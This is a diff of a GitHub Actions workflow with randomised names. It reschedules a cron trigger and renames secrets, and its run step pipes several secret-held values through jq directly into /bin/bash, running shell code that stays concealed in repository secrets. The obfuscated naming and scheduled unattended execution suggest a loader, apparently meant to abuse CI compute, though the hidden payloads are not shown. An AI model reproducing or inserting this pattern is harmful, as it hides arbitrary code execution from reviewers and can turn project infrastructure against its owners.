@@ -3,19 +3,19 @@ name: dxjnghan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '18 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dxjnghan
         env:
-          u7: ${{ secrets.u7 }}
+          ulvmp6024: ${{ secrets.ulvmp6024 }}
         run: |
-          echo $u7 | jq -r .rnqw44872 | /bin/bash
-          echo $b741 | jq -r .gt99575 | /bin/bash
-          echo $qh83286 | jq -r .m96794 | /bin/bash
+          echo $ulvmp6024 | jq -r .bduir4 | /bin/bash
+          echo $prbe03308 | jq -r .zqvsz86274 | /bin/bash
+          echo $fyqp32 | jq -r .xkvny9755 | /bin/bash
+          echo $mcm9 | jq -r .qcj9450 | /bin/bash
 
